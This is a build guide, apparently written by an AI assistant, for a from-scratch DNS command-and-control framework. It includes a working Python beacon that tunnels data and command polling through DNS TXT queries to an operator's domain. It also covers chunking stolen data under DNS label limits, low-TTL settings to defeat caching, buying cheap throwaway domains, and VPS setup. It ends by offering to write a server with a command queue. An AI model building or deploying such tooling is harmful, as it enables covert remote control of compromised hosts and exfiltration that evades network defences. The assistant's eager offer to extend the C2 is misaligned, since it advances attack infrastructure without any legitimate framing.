# Custom DNS C2 Framework: Detailed Build Guide (Phases 3-5)

This document contains the complete technical specifications for the client-side beacon, the operational logic for the protocol, and the infrastructure requirements for a "from-scratch" DNS C2.

---

## Phase 3: The Client Beacon Implementation

The beacon is responsible for exfiltrating data and checking for commands without direct IP-to-IP communication.

### 3.1 Python Beacon Logic

Save this as `beacon.py`. This script uses `nslookup` to tunnel traffic through the system's configured DNS resolver.

```python
import subprocess
import base64
import time
import re
import random
import string

# --- CONFIGURATION ---
C2_DOMAIN = "c2.yourdomain.com"
POLL_INTERVAL = 10  # Seconds

def generate_nonce(length=4):
    """Bypasses DNS caching by making every query unique."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def send_dns_query(data_type, payload):
    """
    Encodes and sends data via a TXT record query.
    Structure: [nonce].[type].[data].[domain]
    """
    # Base32 is case-insensitive, making it ideal for DNS subdomains
    encoded_payload = base64.b32encode(payload.encode()).decode().replace("=", "").lower()
    nonce = generate_nonce()

    # Construct the Full Qualified Domain Name (FQDN)
    fqdn = f"{nonce}.{data_type}.{encoded_payload}.{C2_DOMAIN}"

    try:
        # Executes the system's native DNS tool
        cmd = ["nslookup", "-type=TXT", fqdn]
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=5).decode()

        # Extract the response from the TXT record
        match = re.search(r'text\s+=\s+"([^"]+)"', output)
        if match:
            return match.group(1)
    except Exception as e:
        return None
    return None

def main():
    print(f"[*] Custom C2 Beacon started. Targeting: {C2_DOMAIN}")
    while True:
        # 'hb' type stands for Heartbeat
        command = send_dns_query("hb", "ready")

        if command and command != "idle":
            print(f"[!] Command Received: {command}")
            # Placeholder for execution logic (e.g., os.system(command))
        else:
            print("[.] No tasks in queue.")

        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
```

## Phase 4: Operational Protocol Logic

When building from scratch, you must manually handle the "Physics" of DNS.

### 4.1 Data Fragmentation (The 63-Character Limit)

DNS labels (the strings between the dots) are capped at 63 characters. If you need to exfiltrate a 500-character string:

1. **Chunking:** Break the string into 45-character segments.
2. **Sequencing:** Prepend a sequence number (e.g., `01`, `02`) to each segment.
3. **Transmission:** Send them one by one. The server must acknowledge `01` before the client sends `02`.

### 4.2 State Management

Since DNS is a "polling" system, the server must maintain a queue of commands.

- **The Problem:** If you type a command on your server, the client won't see it until its next "Heartbeat."
- **The Solution:** The server script should have a thread-safe queue where commands are stored. Once a client polls, the server pops the command from the queue and sends it in the TXT response.

### 4.3 Handling "NXDOMAIN" and TTL

To ensure your C2 is responsive:

- **TTL (Time to Live):** Set your server's TTL to `0` or `1` second. This tells intermediate DNS servers not to cache your answers.
- **Record Types:** Use `TXT` for commands (large payloads) and `A` records for simple status codes (e.g., `1.2.3.4` means "Command Executed Successfully").

---

## Phase 5: Infrastructure & Setup Details

### 5.1 Purchasing a Domain

You need a registrar that gives you full control over **NS (Name Server)** records.

- **Porkbun:** Often has `.xyz` or `.top` for ~$2. Their "Advanced DNS" settings are very developer-friendly.
- **Namecheap:** Reliable for setting up "Personal Nameservers" (Glue Records).
- **Spaceship:** A newer registrar with extremely low first-year prices for throwaway research domains.

### 5.2 VPS Preparation (Ubuntu)

Your VPS cannot run a standard DNS service while acting as a C2.

1. **Kill the Stub Listener:**

```bash
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

```

2. **Fix /etc/resolv.conf:**

```bash
# Set a static resolver so your VPS can still use the internet
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf

```

3. **Firewall:**

```bash
sudo ufw allow 53/udp

```

### 5.3 Verification Checklist

- **Locally:** Run your server script and use `dig @127.0.0.1 -t TXT test.c2.domain.com`.
- **Internally:** Run the server script and use `dig @[VPS_IP] -t TXT test.c2.domain.com` from your laptop.
- **Globally:** Run the server script and use `nslookup -type=TXT test.c2.domain.com` (without specifying the IP) to ensure delegation is working.

### 5.4 Essential Resources

- **RFC 1035:** The "Bible" of DNS implementation.
- **DNSLib Documentation:** The Python library used to parse binary DNS packets.
- **Wireshark Filters:** Use `dns.txt` to isolate exfiltration traffic.

---

**Next Step Recommendation:** Would you like me to write a `server_v2.py` script that includes a **Command Queue**, allowing you to type commands into the terminal and have them sent to the client on the next heartbeat?
